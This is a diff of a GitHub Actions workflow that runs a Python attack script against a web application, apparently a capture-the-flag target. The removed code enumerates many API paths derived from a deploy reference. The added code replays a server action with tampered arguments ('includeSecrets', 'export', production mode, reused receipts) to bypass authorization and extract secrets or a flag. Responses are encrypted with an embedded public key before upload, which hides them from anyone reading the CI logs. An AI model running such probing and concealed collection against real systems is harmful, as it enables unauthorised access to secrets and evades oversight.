@@ -10,9 +10,9 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 2
     steps:
-      - name: Probe export/release paths derived from deployRef
+      - name: Test top deployRef combinations and encrypt responses
         shell: bash
         run: |
           set -euo pipefail
@@ -30,33 +30,24 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests,pathlib,urllib.parse,json,itertools
+          import requests,pathlib,urllib.parse,json
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=10).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=10).json(); act=refs['serverActions']['inspectDeploy']
-          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
-          inv=s.post(urllib.parse.urljoin(base,act['endpoint']),headers=H,json={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},timeout=10).json(); ref=inv['inspector']['deployRef']
-          roots=['deploy','deployment','deploys','deployments','preview','previews','inspect','inspector','artifact','artifacts','release','releases','publish','publishes']
-          ops=['export','release','publish','promote','finalize','approve','approval','review','download','artifact','artifacts','flag','secrets','secret','metadata','details','status','open','inspect','production','enterprise','rollout']
-          paths=set()
-          for root,op in itertools.product(roots,ops):
-            paths.add(f'/api/{root}/{ref}/{op}'); paths.add(f'/api/{root}/{op}/{ref}')
-          bodies=[{}, {'deployRef':ref},{'deploy_ref':ref},{'ref':ref},{'id':ref},{'projectId':boot['project'],'workspaceId':boot['workspace'],'deployRef':ref}]
-          hits=[]
-          for path in sorted(paths):
-            u=urllib.parse.urljoin(base,path)
-            try:
-              r=s.get(u,headers=H,timeout=6,allow_redirects=False)
-              if r.status_code!=404:hits.append({'path':path,'method':'GET','status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-            except Exception:pass
-            for b in bodies:
-              try:
-                r=s.post(u,headers=H,json=b,timeout=6,allow_redirects=False)
-                if r.status_code!=404:
-                  hits.append({'path':path,'method':'POST','sent':b,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-                  if 'caplag{' in r.text:break
-              except Exception:pass
-          (out/'summary.json').write_text(json.dumps({'deployRef':ref,'hits':hits},indent=2))
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=8).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=8).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=8).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
+          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}; ws=boot['workspace']; p=boot['project']; ref='preview-8b11c'; baseargs={'workspaceId':ws,'projectId':p}
+          extras=[
+            {'deployRef':ref,'export':True},{'deploy_ref':ref,'export':True},{'ref':ref,'export':True},
+            {'deployRef':ref,'mode':'export'},{'deployRef':ref,'mode':'release'},{'deployRef':ref,'mode':'deploy'},{'deployRef':ref,'mode':'production'},
+            {'deployRef':ref,'operation':'export'},{'deployRef':ref,'action':'export'},{'deployRef':ref,'purpose':'export'},
+            {'deployRef':ref,'includeSecrets':True},{'deployRef':ref,'includeArtifact':True},{'deployRef':ref,'full':True},{'deployRef':ref,'download':True},
+            {'deployRef':ref,'scope':'deploy:inspect'},{'deployRef':ref,'scope':'preview:deploy:inspect'},{'deployRef':ref,'target':'production'},
+            {'deployRef':ref,'receipt':mf['previewReceipt'],'export':True},{'deployRef':ref,'build':mf['build'],'export':True},
+            {'deployRef':ref,'receipt':mf['previewReceipt'],'mode':'release','export':True}
+          ]
+          res=[]
+          for e in extras:
+            a={**baseargs,**e}; r=s.post(url,headers=H,json={'actionId':act['id'],'args':a},timeout=8,allow_redirects=False); res.append({'extra':e,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+          (out/'summary.json').write_text(json.dumps(res,indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -72,6 +63,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-ref-export-encrypted
+          name: launchlet-part2-fastcombo-encrypted
           path: artifact/
           retention-days: 1
